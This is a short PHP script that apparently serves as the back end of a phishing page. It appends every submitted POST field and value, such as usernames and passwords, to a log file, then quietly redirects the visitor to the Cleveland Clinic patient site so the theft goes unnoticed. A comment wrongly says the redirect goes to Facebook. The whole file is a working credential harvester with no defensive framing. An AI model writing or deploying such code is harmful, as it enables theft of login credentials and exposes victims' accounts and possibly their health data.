<?php 
// Redirect the user to Facebook
header('Location: https://my.clevelandclinic.org/');

// Open the file log.txt in append mode
$file = fopen("log.txt", "a"); // Corrected: Closing double-quote for filename

if ($file) { // Check if the file was successfully opened
    foreach ($_POST as $variable => $value) {
        // Write each POST variable and value to the file
        fwrite($file, $variable . "=" . $value . PHP_EOL); // Add newline for better readability
    }
    fclose($file); // Close the file after writing
} else {
    // Handle file open failure (optional)
    error_log("Unable to open log.txt for writing.");
}
?>
